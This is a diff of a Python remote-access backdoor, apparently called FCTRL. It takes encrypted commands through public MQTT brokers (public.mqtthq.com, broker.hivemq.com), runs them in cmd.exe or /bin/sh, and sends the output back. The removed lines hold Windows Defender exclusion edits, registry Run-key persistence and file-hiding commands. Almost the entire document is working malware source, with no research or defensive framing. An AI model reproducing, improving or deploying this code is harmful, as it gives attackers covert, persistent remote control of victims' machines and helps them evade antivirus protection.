@@ -1,174 +1,142 @@
-import paho.mqtt.client as mqtt_client
+import paho.mqtt.client as mqtt
 import socket
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from Crypto.Random import get_random_bytes
+import base64
+import uuid
+import json
 import os
 import sys
 import subprocess
-import hashlib
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
-import json
-import locale
 import threading
 import time
 
-systype = ("windows" if os.name == "nt" else "unix")
+default_shell = "cmd.exe" if os.name == "nt" else "/bin/sh"
+hostname = f"{os.getpid()}@{socket.gethostname()}"
+sessions = {}
 
-def getpath():
-    if getattr(sys, "frozen", False):
-        application_path = sys.executable
-    elif __file__:
-        application_path = os.path.abspath(__file__)
-    return application_path
+key = b"fe333581d9f246ee" # get_random_bytes(16)
+cipher = AES.new(key, AES.MODE_CBC)
+iv = cipher.iv
 
-if systype == "windows":
-    print(os.popen('reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v .exe /t REG_DWORD /d 1 /f').read())
-    print(os.popen('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v .exe /t REG_DWORD /d 1 /f').read())
-    print(os.popen(f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "FCTRL non-auto setup" /d "{getpath()}" /f').read())
-    print(os.popen(f'reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v "FCTRL non-auto setup" /d "{getpath()}" /f').read())
-    print(os.system(f'attrib +s +h +a "{getpath()}"'))
+def encrypt_message(message, key, iv):
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    encrypted_message = cipher.encrypt(pad(message.encode("utf-8"), AES.block_size))
+    return base64.b64encode(iv + encrypted_message).decode("utf-8")
 
-os.chdir(os.path.expanduser("~"))
-runpath_dict = {}
-host = socket.gethostbyname(socket.gethostname())
-
-client_id = f"{os.getpid()}@{socket.gethostname()}"
-topic_list = {
-    "stats":"/MQTT/stats", 
-    "MQTT":"/MQTT", 
-    "result":"/MQTT/result"
-}
-connected = False
-donejob_list = []
-
-key = b"replacewithlen16"
-iv = b"replacewithlen16"
-
-def gen_id():
-    return hashlib.md5(str(time.time()).encode()).hexdigest()
-
-def encrypt(plaintext:bytes, key=key, iv=iv):
-    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
-    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
-    return ciphertext
-
-def decrypt(ciphertext:bytes, key=key, iv=iv):
+def decrypt_message(encrypted_message, key):
     try:
-        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
-        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
-        return plaintext
-    except:
-        return False
+        encrypted_message = base64.b64decode(encrypted_message)
+        iv = encrypted_message[:AES.block_size]
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        decrypted_message = unpad(cipher.decrypt(encrypted_message[AES.block_size:]), AES.block_size)
+        return decrypted_message.decode("utf-8")
+    except (ValueError, KeyError):
+        return None
+    
+def handle_output(session_id):
+    pipe = sessions[session_id].stdout
 
-def mode_cmd(job_id, session_id, cmd):
-    global client, donejob_list, runpath_dict
+    sys.stdout.write("")
+    sys.stdout.flush()
 
-    if not job_id in donejob_list:
-        cmd = cmd
-        if cmd.lower() == "exit":
-            p = subprocess.Popen(f"taskkill -F -PID {os.getpid()}" if os.name == "nt" else f"kill -9 {os.getpid()}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            stdout, stderr = p.communicate()
-        elif cmd.startswith("cd "):
-            directory = cmd.split("cd ",1)[1]
-            if directory:
-                if directory[0] == directory[-1] == "%" and systype == "windows":
-                    directory = os.environ.get(directory[1:-1], directory)
-                elif directory[0] == "$" and systype != "windows":
-                    directory = os.environ.get(directory[1:], directory)
-                
-                if directory[0] == directory[-1] == '"':
-                    directory = directory[1:-1]
-
-                if os.path.isdir(directory):
-                    os.chdir(directory)
-                    runpath_dict[session_id] = os.getcwd()
-                elif os.path.isdir(os.path.join(runpath_dict[session_id], directory)):
-                    os.chdir(os.path.join(runpath_dict[session_id], directory))
-                    runpath_dict[session_id] = os.getcwd()
-
-            if systype == "windows":
-                cmd = "cd"
-            else:
-                cmd = "pwd"
-        elif cmd.endswith(":"):
-            if os.path.isdir(cmd):
-                os.chdir(cmd)
-                runpath_dict[session_id] = os.getcwd()
-                if systype == "windows":
-                        cmd = "cd"
-                else:
-                    cmd = "pwd"
-
-        encoding = locale.getdefaultlocale()[1]
-        p = subprocess.Popen(cmd, cwd=runpath_dict[session_id], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        stdout, stderr = p.communicate()
-        if p.returncode == 0:
-            result = stdout.decode(encoding, errors="replace")
-            iserr = 0
+    while True:
+        output = pipe.readline(1)
+        if output:
+            publish_json_message(client, topic, {
+                "type": "cmdoutput",
+                "session_id": session_id,
+                "output": output
+            })
         else:
-            result = stderr.decode(encoding, errors="replace")
-            iserr = 1
-        send(client, topic_list["result"], {"job_id": job_id, "result": result, "iserr": iserr}, qos=2)
-        donejob_list.append(job_id)
-    else:
-        send(client, topic_list["result"], {"job_id": job_id, "result": b"Same job id not accepted. ", "iserr": 1}, qos=2)
+            publish_json_message(client, topic, {
+                "type": "end_session",
+                "target": hostname,
+                "session_id": session_id
+            })
+            sessions[session_id].terminate()
+            break
+
+broker = "broker.hivemq.com"
+port = 1883
+topic = "FCTRL/secure"
 
 def on_connect(client, userdata, flags, rc):
-    global connected
-    connected = True
-    print("Connected with result code: "+str(rc))
-    client.subscribe(topic_list["MQTT"])
-
-def on_disconnect(client, userdata, rc):
-    global connected
-    connected = False
-    print("Disconnected with result code: "+str(rc))
+    print(f"[+] Connected with result code {rc}")
+    client.subscribe(topic)
 
 def on_message(client, userdata, msg):
-    try:
-        global client_id, runpath_dict
+    decrypted_message = decrypt_message(msg.payload.decode("utf-8"), key)
+    if decrypted_message is not None:
+        try:
+            json_message = json.loads(decrypted_message)
+            
+            if json_message.get("target") == hostname:
+                if json_message.get("type") == "new_session":
+                    session_id = uuid.uuid4().hex
 
-        msg.payload = decrypt(msg.payload)
-        if msg.payload:
-            msg_json = json.loads(msg.payload)
-            session_id = msg_json["session_id"]
-            target = msg_json["target"]
-            if target == client_id:
-                mode = msg_json["mode"]
-                if mode == "cmd":
-                    job_id = msg_json["job_id"]
-                    cmd = msg_json["cmd"]
-                    if not session_id in list(runpath_dict):
-                        runpath_dict[session_id] = os.path.expanduser("~")
-                    run_thread = threading.Thread(target=mode_cmd, args=(job_id, session_id, cmd))
-                    run_thread.start()
-                else:
-                    pass
-    except Exception as err:
-        pass
+                    message_id = json_message.get("message_id")
+                    
+                    publish_json_message(client, topic, {
+                        "type": "confirm_session",
+                        "message_id": message_id,
+                        "session_id": session_id
+                    })
+                if json_message.get("type") == "start_session":
+                    session_id = json_message.get("session_id")
 
-def send(client:mqtt_client.Client, topic, content:dict, qos=0):
-    return client.publish(topic, encrypt(json.dumps(content).encode()), qos=qos)
+                    sessions[session_id] = subprocess.Popen(default_shell, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding="utf-8", text=True)
+                    threading.Thread(target=handle_output, args=(session_id,), daemon=True).start()
+                if json_message.get("type") == "cmd_input":
+                    session_id = json_message.get("session_id")
+                    command = json_message.get("input")
+        
+                    if session_id in sessions:
+                        sessions[session_id].stdin.write(command + "\n")
+                        sessions[session_id].stdin.flush()
+        except json.JSONDecodeError:
+            print("[-] Failed to decode JSON from the message")
+    else:
+        print("[-] Failed to decrypt the message")
 
-client = mqtt_client.Client()
+client = mqtt.Client()
 client.on_connect = on_connect
-client.on_disconnect = on_disconnect
 client.on_message = on_message
 
-def upload_stats():
+client.connect(broker, port, 60)
+
+def publish_json_message(client, topic, message:json):
+    json_message = json.dumps(message)
+    iv = get_random_bytes(16)
+    encrypted_message = encrypt_message(json_message, key, iv)
+    client.publish(topic, encrypted_message)
+
+client.loop_start()
+
+def update_status():
     while True:
-        if connected:
-            result, mid = send(client, topic_list["stats"], {"client_id": client_id})
-            print(result, mid)
+        publish_json_message(client, topic, {
+            "type": "status",
+            "client": hostname
+        })
         time.sleep(0.5)
 
-stats_thread = threading.Thread(target=upload_stats)
-stats_thread.start()
+threading.Thread(target=update_status, daemon=True).start()
 
-while True:
-    try:
-        client.connect("public.mqtthq.com", 1883, 60)
-        client.loop_start()
-        break
-    except Exception as e:
-        print(f"Could not connect: {e}, retrying...")
-        time.sleep(2)
+try:
+    while True:
+        pass
+except KeyboardInterrupt:
+    print("[-] Disconnecting from broker")
+    client.loop_stop()
+    client.disconnect()
+finally:
+    for session in sessions:
+        publish_json_message(client, topic, {
+            "type": "end_session",
+            "target": hostname,
+            "session_id": session
+        })
+        sessions[session].terminate()
+        
